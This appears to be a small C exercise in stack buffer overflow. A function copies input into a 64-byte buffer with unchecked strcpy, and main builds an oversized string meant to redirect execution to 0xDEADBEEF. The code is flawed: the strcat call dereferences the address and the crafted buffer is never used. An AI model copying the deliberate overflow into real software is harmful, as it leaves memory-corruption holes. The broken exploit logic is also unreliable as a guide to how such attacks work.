/*
	Exploit itCouldCrash function in order to execute code from address 0xDEADBEEF
*/
#include <string.h>

int itCouldCrash(char* x)
{
	char buff[64];
	int a;
	strcpy(buff, x);
	return 1000;
}

int main()
{
 	//  				 0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF01234567
 	char crapator[80] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa00000000";	// + 0xDEADBEEF
 	strcat(crapator, (char *)(0xDEADBEEF));
 	itCouldCrash("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa000000000000");
}